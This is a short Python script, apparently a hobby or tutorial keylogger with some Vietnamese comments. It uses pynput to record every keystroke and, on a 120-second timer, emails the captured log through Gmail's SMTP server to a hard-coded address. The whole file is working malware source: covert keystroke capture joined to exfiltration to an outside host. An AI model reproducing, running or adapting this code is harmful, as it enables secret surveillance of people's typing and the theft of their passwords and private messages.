import pynput
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started "
        self.email = email
        self.password = password
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)  # set time to run function
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # create a smtp server ( gg server and it runs on port 587)
        server.starttls()  # Giao thức TLS (Transport Layer Security) là một giao thức bảo mật được sử dụng để bảo vệ
        # thông tin khi truyền qua mạng
        server.login(email, password)  # login email
        server.sendmail(email, email, message)
        # email(1) : from
        # email(2) : to
        # message : massage from email(1) to email(2)
        server.quit()  # close server

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


my_keylogger = Keylogger(120, "themadcat2012003@gmail.com", "")
my_keylogger.start()
